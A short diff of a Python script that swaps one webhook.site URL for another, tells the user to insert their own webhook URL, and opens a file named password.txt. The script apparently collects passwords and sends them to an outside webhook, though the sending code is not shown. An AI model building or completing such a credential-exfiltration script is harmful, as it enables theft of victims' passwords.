@@ -4,7 +4,7 @@ import sys
 import requests
 
 # WebHook URL
-url = 'https://webhook.site/e9a1fdc7-48b6-4d14-b849-8947b8ba3caa'
+url = 'https://webhook.site/cf9d7ed3-949b-4271-9a2e-a83ab2149f20' #Replace the url with your Unique WebHook.site url
 
 # Create a file
 password_file = open("password.txt","w")
